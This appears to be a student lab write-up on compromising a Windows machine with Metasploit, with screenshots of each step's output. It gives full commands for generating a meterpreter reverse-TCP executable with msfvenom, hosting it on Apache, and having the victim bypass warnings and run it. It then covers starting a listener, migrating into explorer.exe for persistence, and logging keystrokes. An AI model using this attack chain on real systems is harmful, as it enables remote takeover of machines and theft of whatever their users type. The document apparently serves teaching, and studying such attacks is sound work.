
# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig
## OUTPUT:
<img width="559" height="277" alt="424628187-2f69d906-0b7a-4878-8f96-272bacc10e00" src="https://github.com/user-attachments/assets/71921d67-7f21-4d20-917c-4065ae3d6da0" />

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
<img width="758" height="122" alt="424628371-88b39238-d2b6-447d-bc46-08dc30ccab8e" src="https://github.com/user-attachments/assets/d7a6aea0-afd5-4058-ad01-d57b6f96ce2e" />

copy the fun.exe into the apache /var/www/html folder
## OUTPUT
<img width="275" height="36" alt="424628537-5034838b-e3d2-4f9f-b645-21b5c8ecdcba" src="https://github.com/user-attachments/assets/179a3b6f-5580-42a5-b0ec-7f37c25e1077" />

Start apache server
sudo systemctl apache2 start
## OUTPUT
<img width="255" height="42" alt="424628697-7cb75fb5-6fa0-449a-8b21-e8f8b2fb6fcf" src="https://github.com/user-attachments/assets/207779da-f308-4b97-bdab-4aefc67e34d3" />

Check the status of apache2
## OUTPUT
<img width="718" height="289" alt="424628879-d8909df4-12f7-4a3a-888f-f8891c81c5e9" src="https://github.com/user-attachments/assets/50ee9afa-18eb-4573-ae7f-38606aa19e3c" />

Invoke msfconsole:
## OUTPUT:
<img width="656" height="362" alt="424629400-9d3f4d70-6d31-454a-81e8-105eb0224090" src="https://github.com/user-attachments/assets/5033d8f6-3cd0-4a69-acc8-3417e3cb43c5" />

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="774" height="487" alt="424629526-ffd46926-d6b7-4ad2-8df4-26cd01a10af1" src="https://github.com/user-attachments/assets/5621f466-4155-4ec6-98ab-c27556ce274d" />

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
## OUTPUT:
<img width="343" height="96" alt="424629703-e92d7605-0cdd-4a60-9fbc-f87490d37a9f" src="https://github.com/user-attachments/assets/a74d7dd3-cc9e-4541-9070-a165acbd395e" />

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
## OUTPUT:
<img width="470" height="88" alt="424630204-2094ca08-d751-4add-af92-0ab1d0d1da53" src="https://github.com/user-attachments/assets/6fa51b48-f7bc-43a2-9736-67dbd1bad905" />

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

## OUTPUT:
<img width="798" height="457" alt="424630581-e61066d7-12fb-4942-9f01-3906941f7c47" src="https://github.com/user-attachments/assets/5009c363-1867-4f83-9f03-b12fee8f97c5" />

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
<img width="157" height="29" alt="424630759-fd50817c-df2b-40e2-bcb3-920d2baa5da0" src="https://github.com/user-attachments/assets/e115e478-dc9b-493d-8e1a-28fe2af995cb" />

keyscan_dump Shows the keystrokes captured so far
## OUTPUT:
<img width="420" height="91" alt="424631195-a5ce96df-cd40-4772-b531-90cf2462d6bf" src="https://github.com/user-attachments/assets/4eb6b853-e96d-4cb3-8b0c-56a41c3f2562" />

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
